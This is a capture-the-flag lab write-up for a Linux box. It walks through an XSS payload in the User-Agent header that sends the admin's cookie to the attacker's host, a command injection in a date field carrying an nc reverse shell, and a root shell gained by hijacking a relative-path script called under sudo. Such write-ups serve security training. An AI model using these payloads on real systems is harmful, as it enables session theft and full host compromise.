

## Lab Details
- Difficulty: Easy
- OS:Linux

## Summary
- Initial access:  XSS, Command Injection
- Privilege escalation: Vulnerable command 

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.174.137 -p22,5000 -sC -sV -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 17:33 -0700
Nmap scan report for 10.129.174.137
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Run `ffuf` to fuzz for endpoints, found support and dashboard
```
$ ffuf -u http://10.129.174.137:5000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -fc 403
<SNIP>
support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 229ms]
dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 213ms]
```
## Foothold

#### Steps

![[Pasted image 20260529083630.png]]
- If we input anything in the message field with XSS it will be filtered  
![[Pasted image 20260529084210.png]]
- The response states that our browser information been sent to admin for investigation 
- Which hints at the header info is processed on the back
- We can attempt to perform XSS against the header to obtain cookies of admin 
- First prepare the XSS payload, set the source location back to us
```
User-Agent: <script>var i=new Image();i.src="http://10.10.14.109:8001/?cookie="+btoa(document.cookie);</script>
```
- Then start simple web server
```
$ python3 -m http.server 8001
```
- Need to ensure the message field still contains a vulnerable Js tag to trigger for the error message
- Blow is the captured post request
```
POST /support HTTP/1.1

Host: 10.129.25.186:5000

User-Agent: <script>var i=new Image();i.src="http://10.10.14.109:8001/?cookie="+btoa(document.cookie);</script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 71

Origin: http://10.129.25.186:5000

Connection: keep-alive

Referer: http://10.129.25.186:5000/support

Upgrade-Insecure-Requests: 1

Priority: u=0, i



fname=test&lname=test&email=test%40test.com&phone=test&message=<script>
```
- A response back to our simple web server
```
10.129.25.186 - - [28/May/2026 17:59:32] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```
- Cookie is base64 encoded attempt to decode it and we've obtained the admin's cookie
```
$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d

is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
- Create a new cookie `is_admin` and value `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
![[Pasted image 20260529092323.png]]
- Presented with the admin dashboard
![[Pasted image 20260529092337.png]]
- When clicking on `Generate Report` we get a message `all system is update and running`
- Attempt to perform a command injection against the date field, we get a reponse back for `id`
![[Pasted image 20260529092451.png]]
- Attempt to inject RCE payload
```
date=2023-09-15;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.109%204444%20%3E%2Ftmp%2Ff
```
- We get a connection back
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.25.186] 51442
sh: 0: can't access tty; job control turned off
$ id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Check `sudo -l`
```
dvir@headless:~$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
- Identified the user is able to run `syscheck`
- Investigate `syscheck`
```
dvir@headless:~$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
- Identified that `inidb.sh` is been called as relative path and we can attempt to create a malicious version at a directory and run the command as root to gain root access
- Creating a malicious `initdb.sh`
```
dvir@headless:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.109 4445 >/tmp/f" > initdb.sh
```
- Granting execution permission
```
dvir@headless:~$ chmod +x ./initdb.sh
```
- Run the command as root
```
dvir@headless:~$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.8G
System load average:  0.01, 0.11, 0.17
Database service is not running. Starting it...
```
- Root shell received 
```
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.25.186] 50620
# whoami
root
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References:
